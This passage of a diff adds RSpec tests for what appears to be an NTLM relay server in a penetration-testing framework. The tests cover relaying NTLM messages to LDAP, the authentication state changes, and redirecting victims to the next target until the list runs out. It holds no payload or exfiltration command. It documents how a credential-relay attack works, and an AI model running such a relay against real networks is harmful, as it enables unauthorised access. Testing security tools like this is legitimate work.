++      it 'responds with a 401 and tracks state as unauthenticated' do
++        expect(mock_cli).to receive(:put).with(/401 Unauthorized/)
++
++        relay_server.on_relay_request(mock_cli, create_request)
++
++        client = get_client_state(relay_server)
++        expect(client).not_to be_nil
++        expect(client.state).to eq(:unauthenticated)
++      end
++    end
++
++    context 'when receiving a Type 1 message' do
++      let(:req1) { create_request("NTLM #{type1_b64}") }
++
++      it 'relays to LDAP, sends Type 2 challenge, and transitions state to awaiting_type3' do
++        expect(mock_cli).to receive(:send_response).with(satisfy { |res| res.code == 401 })
++
++        relay_server.on_relay_request(mock_cli, req1)
++
++        client = get_client_state(relay_server)
++        expect(client).not_to be_nil
++        expect(client.state).to eq(:awaiting_type3)
++      end
++    end
++  end
++
++  describe 'Target Iteration and Exhaustion' do
++    let(:req1) { create_request("NTLM #{type1_b64}") }
++    let(:req3) { create_request("NTLM #{type3_b64}") }
++
++    before(:each) do
++      relay_server.on_relay_request(mock_cli, req1)
++    end
++
++    context 'when LDAP authentication succeeds' do
++      it 'calls on_relay_success and redirects to the next target' do
++        expect(relay_server).to receive(:on_relay_success)
++        expect(mock_cli).to receive(:send_response).with(satisfy { |res| res.code == 307 })
++
++        relay_server.on_relay_request(mock_cli, req3)
++
++        client = get_client_state(relay_server)
++        expect(client.state).to eq(:unauthenticated)
++      end
++    end
++
++    context 'when LDAP authentication fails' do
++      before(:each) do
++        allow(mock_ldap_client).to receive(:relay_ntlmssp_type3).and_return(type3_fail_result)
++      end
++
++      it 'redirects to the next target and resets state to unauthenticated' do
++        expect(mock_cli).to receive(:send_response).with(satisfy { |res| res.code == 307 })
++
++        relay_server.on_relay_request(mock_cli, req3)
++
++        client = get_client_state(relay_server)
++        expect(client.state).to eq(:unauthenticated)
++      end
++    end
++
++    context 'when the target list is completely exhausted' do
++      before(:each) do
++        allow(target_list).to receive(:next).and_return(nil)
++      end
++
++      it 'sends a 404 and garbage collects the client state entirely' do
++        expect(mock_cli).to receive(:send_response).with(satisfy { |res| res.code == 404 })
++
++        relay_server.on_relay_request(mock_cli, req3)
++
++        client = get_client_state(relay_server)
++        expect(client).to be_nil
++      end
++    end
++  end
++end
+\ No newline at end of file
